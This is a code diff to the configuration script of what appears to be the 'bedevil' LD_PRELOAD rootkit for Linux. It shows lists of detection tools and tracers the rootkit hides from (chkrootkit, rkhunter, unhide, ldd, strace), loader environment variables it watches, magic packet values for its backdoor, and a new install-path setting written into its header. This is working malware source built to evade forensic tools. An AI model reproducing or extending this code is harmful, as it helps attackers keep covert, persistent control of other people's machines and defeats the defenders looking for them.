@@ -147,13 +147,11 @@ validpkgmans = ['apt', 'yum', 'pacman', 'emerge']
 #    a. processes with certain environment variables set,
 #    b. processes that need to access certain paths,
 #    c. or just processes whose names match those below.
-scary_variables = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG',
-                   'LD_AUDIT']
+scary_variables = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG', 'LD_AUDIT']
 scary_paths = ['*/*ld-linux*.so.*', '*ld-linux*.so.*',
                '*/*ld-*.so', '*ld-*.so', '*/ld-*.so.*']
-scary_procs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide',
-               'rkhunter', 'chkproc', 'chkdirs', 'ltrace',
-               'strace']
+scary_procs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide', 'rkhunter',
+               'chkproc', 'chkdirs', 'ltrace','strace']
 
 # valid platforms for target shared object when installing. (`./bdvinstall [path]...`)
 valid_platforms = ['x86_64', 'i686', 'v6l', 'v7l']
@@ -334,6 +332,9 @@ class Util():
         contentsarr = CArray(arrname, contentslist, arrtype='char')
         return contentsarr.create()
 
+    def sogetplainpath(self, instdir, soname):
+        return '{0}/{1}'.format(instdir, soname)
+
     def sogetpath(self, instdir, soname):
         return '{0}/{1}.$PLATFORM'.format(instdir, soname)
 
@@ -437,7 +438,7 @@ SETTINGS = { # all of these are written to bedevil.h. if a value is None it is s
     'MAX_GID':MAX_GID,                       'MIN_GID':MIN_GID,
     'TARGET_INTERFACE':TARGET_INTERFACE,     'MAGIC_ID':MAGIC_ID,
     'MAGIC_SEQ':MAGIC_SEQ,                   'MAGIC_ACK':MAGIC_ACK,
-    'EXEC_LOGS':ut.randpath(17)
+    'EXEC_LOGS':ut.randpath(17),             'PLAINSOPATH':ut.sogetplainpath(INSTALL_DIR, BDVLSO)
 }
 
 # the following paths are linked to within the installation directory.
